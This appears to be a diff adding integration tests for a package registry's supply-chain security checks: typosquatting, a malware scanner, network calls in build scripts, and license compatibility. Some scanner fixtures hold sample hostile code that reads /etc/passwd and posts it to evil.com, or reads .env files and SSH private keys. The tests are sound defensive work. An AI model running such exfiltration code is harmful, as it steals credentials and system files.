@@ -1,0 +1,278 @@
+// Verum Registry - Security Integration Tests
+//
+// @test: integration
+// @tags: security, typosquatting, malware, license
+//
+// Tests for supply chain security services:
+// - Levenshtein distance computation
+// - Normalized name collision detection
+// - Sensitive file detection in packages
+// - Network access in build scripts
+// - License GPL propagation rules
+
+module tests.integration.security_test;
+
+mount core.collections.{List, Map};
+mount core.base.{Result, Maybe, Text, Int, Bool};
+
+// Import test utilities
+mount super.super.test_utils.{
+    assert_ok,
+    assert_err,
+    assert_eq,
+    assert_ne,
+};
+
+// Import security service
+mount super.super.src.services.security_service.{
+    levenshtein_distance,
+    normalize_package_name,
+    check_typosquatting,
+    TyposquatResult,
+    scan_for_malware,
+    ScanResult,
+    SourceFile,
+    Threat,
+    ThreatCategory,
+    check_license_compatibility,
+    LicenseResult,
+    DependencyLicense,
+    is_license_compatible,
+};
+
+// ============================================================================
+// Levenshtein Distance Tests
+// ============================================================================
+
+@test
+fn test_levenshtein_distance() -> Int {
+    // Identical strings
+    assert_eq(&levenshtein_distance("hello", "hello"), &0);
+
+    // Single insertion
+    assert_eq(&levenshtein_distance("cat", "cats"), &1);
+
+    // Single deletion
+    assert_eq(&levenshtein_distance("cats", "cat"), &1);
+
+    // Single substitution
+    assert_eq(&levenshtein_distance("cat", "car"), &1);
+
+    // Multiple edits
+    assert_eq(&levenshtein_distance("kitten", "sitting"), &3);
+
+    // Empty strings
+    assert_eq(&levenshtein_distance("", "abc"), &3);
+    assert_eq(&levenshtein_distance("abc", ""), &3);
+    assert_eq(&levenshtein_distance("", ""), &0);
+
+    // Real typosquatting examples
+    assert_eq(&levenshtein_distance("http-client", "htpp-client"), &2);
+    assert_eq(&levenshtein_distance("json-parser", "json-parcer"), &1);
+    assert_eq(&levenshtein_distance("crypto", "crypt0"), &1);
+
+    0
+}
+
+// ============================================================================
+// Normalized Name Collision Tests
+// ============================================================================
+
+@test
+fn test_normalized_name_collision() -> Int {
+    // Dash vs underscore normalization
+    let a = normalize_package_name("my-package");
+    let b = normalize_package_name("my_package");
+    assert_eq(&a, &b);
+
+    // Dot separator normalization
+    let c = normalize_package_name("my.package");
+    assert_eq(&a, &c);
+
+    // Case normalization
+    let d = normalize_package_name("My-Package");
+    assert_eq(&a, &d);
+
+    // No separators should be identity (lowercased)
+    let e = normalize_package_name("mypackage");
+    assert_eq(&a, &e);
+
+    // Different packages should not collide
+    let f = normalize_package_name("http-client");
+    let g = normalize_package_name("http-server");
+    assert_ne(&f, &g);
+
+    // Full typosquatting check with normalized collision
+    let existing = List.from(["http-client"]);
+    let result = check_typosquatting("http_client", existing);
+    match result {
+        TyposquatResult.Suspicious { similar_package, distance, reason } => {
+            assert(&reason.contains("separator") || &reason.contains("Normalizes"));
+        },
+        TyposquatResult.Safe => panic("Expected normalized name collision detection"),
+    }
+
+    0
+}
+
+// ============================================================================
+// Sensitive File Detection Tests
+// ============================================================================
+
+@test
+fn test_sensitive_file_detection() -> Int {
+    let mut files = List.new();
+
+    // File accessing /etc/passwd
+    files.push(SourceFile {
+        path: "src/exploit.vr",
+        content: "fn steal() {\n    let data = file.read(\"/etc/passwd\");\n    http.post(\"https://evil.com\", data);\n}",
+    });
+
+    let result = scan_for_malware(files);
+    match result {
+        ScanResult.ThreatDetected { threats } => {
+            // Should detect sensitive path access
+            let has_fs_threat = threats.iter().any(fn(t) {
+                match t.category {
+                    ThreatCategory.FileSystemAccess => true,
+                    _ => false,
+                }
+            });
+            assert(has_fs_threat);
+        },
+        ScanResult.Clean => panic("Expected sensitive file detection"),
+    }
+
+    // Test .env access detection
+    let env_files = List.from([
+        SourceFile {
+            path: "src/config.vr",
+            content: "fn load() { let f = file.read(\".env\"); }",
+        },
+    ]);
+
+    let env_result = scan_for_malware(env_files);
+    match env_result {
+        ScanResult.ThreatDetected { threats } => {
+            assert(&threats.len() >= 1);
+        },
+        ScanResult.Clean => panic("Expected .env access detection"),
+    }
+
+    // Test SSH key access detection
+    let ssh_files = List.from([
+        SourceFile {
+            path: "src/keys.vr",
+            content: "fn exfiltrate() { let k = file.read(\"~/.ssh/id_rsa\"); }",
+        },
+    ]);
+
+    let ssh_result = scan_for_malware(ssh_files);
+    match ssh_result {
+        ScanResult.ThreatDetected { threats } => {
+            assert(&threats.len() >= 1);
+        },
+        ScanResult.Clean => panic("Expected SSH key access detection"),
+    }
+
+    0
+}
+
+// ============================================================================
+// Network in Build Script Tests
+// ============================================================================
+
+@test
+fn test_network_in_build_script() -> Int {
+    // Network access in build script should be flagged
+    let build_files = List.from([
+        SourceFile {
+            path: "build.vr",
+            content: "fn build() {\n    let resp = http.get(\"https://example.com/config\");\n}",
+        },
+    ]);
+
+    let result = scan_for_malware(build_files);
+    match result {
+        ScanResult.ThreatDetected { threats } => {
+            let has_network = threats.iter().any(fn(t) {
+                match t.category {
+                    ThreatCategory.NetworkAccess => true,
+                    _ => false,
+                }
+            });
+            assert(has_network);
+        },
+        ScanResult.Clean => panic("Expected network access detection in build script"),
+    }
+
+    // Same code in non-build file should NOT be flagged as NetworkAccess
+    // (it may still be flagged for other reasons depending on scan rules)
+    let normal_files = List.from([
+        SourceFile {
+            path: "src/client.vr",
+            content: "fn fetch() {\n    let resp = http.get(\"https://api.example.com/data\");\n}",
+        },
+    ]);
+
+    let normal_result = scan_for_malware(normal_files);
+    match normal_result {
+        ScanResult.Clean => {},
+        ScanResult.ThreatDetected { threats } => {
+            // If threats found, none should be NetworkAccess (only build scripts)
+            let has_network = threats.iter().any(fn(t) {
+                match t.category {
+                    ThreatCategory.NetworkAccess => true,
+                    _ => false,
+                }
+            });
+            assert(!has_network);
+        },
+    }
+
+    0
+}
+
+// ============================================================================
+// License GPL Propagation Tests
+// ============================================================================
+
+@test
+fn test_license_gpl_propagation() -> Int {
+    // Permissive licenses are always compatible
+    assert(is_license_compatible("MIT", "MIT"));
+    assert(is_license_compatible("MIT", "Apache-2.0"));
+    assert(is_license_compatible("MIT", "BSD-3-Clause"));
+    assert(is_license_compatible("MIT", "ISC"));
+
+    // GPL dependency with non-GPL project is incompatible
+    assert(!is_license_compatible("MIT", "GPL-3.0"));
+    assert(!is_license_compatible("Apache-2.0", "GPL-2.0"));
+
+    // GPL dependency with GPL project is compatible
+    assert(is_license_compatible("GPL-3.0", "GPL-3.0"));
+    assert(is_license_compatible("GPL-2.0", "GPL-2.0"));
+
+    // LGPL is compatible (dynamic linking)
+    assert(is_license_compatible("MIT", "LGPL-2.1"));
+
+    // AGPL dependency with non-AGPL is incompatible
+    assert(!is_license_compatible("MIT", "AGPL-3.0"));
+    assert(is_license_compatible("AGPL-3.0", "AGPL-3.0"));
+
+    // Full compatibility check with mixed licenses
+    let mut deps = List.new();
+    deps.push(DependencyLicense { package: "lib-a", license: "MIT" });
+    deps.push(DependencyLicense { package: "lib-b", license: "Apache-2.0" });
+
+    let result = check_license_compatibility("MIT", deps);
+    match result {
+        LicenseResult.Compatible => {},
+        LicenseResult.Incompatible { conflicts } => {
+            panic("All permissive licenses should be compatible");
+        },
+    }
+
+    0
+}
